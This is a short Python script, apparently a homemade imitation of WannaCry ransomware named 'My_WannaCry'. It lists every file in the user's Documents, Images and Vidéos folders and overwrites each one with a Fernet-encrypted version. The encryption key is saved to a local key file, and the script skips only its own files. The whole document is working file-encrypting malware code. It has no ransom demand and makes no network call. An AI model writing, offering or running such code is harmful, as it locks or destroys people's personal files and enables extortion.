import os
from cryptography.fernet import Fernet

files0 = []
files1 = []
files2 = []
path0 = os.path.expanduser("~") + "/Documents/"
path1 = os.path.expanduser("~") + "/Images/"
path2 = os.path.expanduser("~") + "/Vidéos/"
key = Fernet.generate_key() #Generate encryption key

with open("filekey.key", "wb") as filekey: #Create key file
    filekey.write(key)

#Gathering all files to encrypt
for file in os.listdir(path0):
    if file == "My_WannaCry.py" or file == "filekey.key" or file == "My_WannaCry_Decrypt.py":
        continue
    if os.path.isfile(path0 + file):
        files0.append(path0 + file)

for file in os.listdir(path1):
    if file == "My_WannaCry.py" or file == "filekey.key" or file == "My_WannaCry_Decrypt.py":
        continue
    if os.path.isfile(path1 + file):
        files1.append(path1 + file)

for file in os.listdir(path2):
    if file == "My_WannaCry.py" or file == "filekey.key" or file == "My_WannaCry_Decrypt.py":
        continue
    if os.path.isfile(path2 + file):
        files2.append(path2 + file)

for file in files0:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    encrypted_contents = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(encrypted_contents)

for file in files1:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    encrypted_contents = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(encrypted_contents)

for file in files2:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    encrypted_contents = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(encrypted_contents)

print(files0)
print(files1)
print(files2)
